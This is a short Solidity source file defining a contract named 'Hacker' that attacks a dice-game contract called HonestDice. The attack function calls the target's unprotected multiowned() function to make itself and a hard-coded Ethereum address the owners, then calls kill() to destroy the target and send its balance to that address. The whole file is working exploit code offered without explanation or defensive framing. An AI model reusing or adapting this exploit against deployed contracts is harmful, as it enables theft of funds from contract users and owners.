pragma solidity ^0.4.24;

interface InterfaceHonestDice {
    function multiowned(address[] _owners, uint _required) external;
    function kill(address _to);
}

contract Hacker {
    InterfaceHonestDice target;

    address[]  arr;

    function attack(address _target) external payable{
        target =  InterfaceHonestDice(_target);
        address _own = address(this);
        arr =  [_own, 0x36DbeFF531486155e8182044b660d76EFd11C47E];
        target.multiowned(arr, 2);
        target.kill(0x36DbeFF531486155e8182044b660d76EFd11C47E);
    }
}
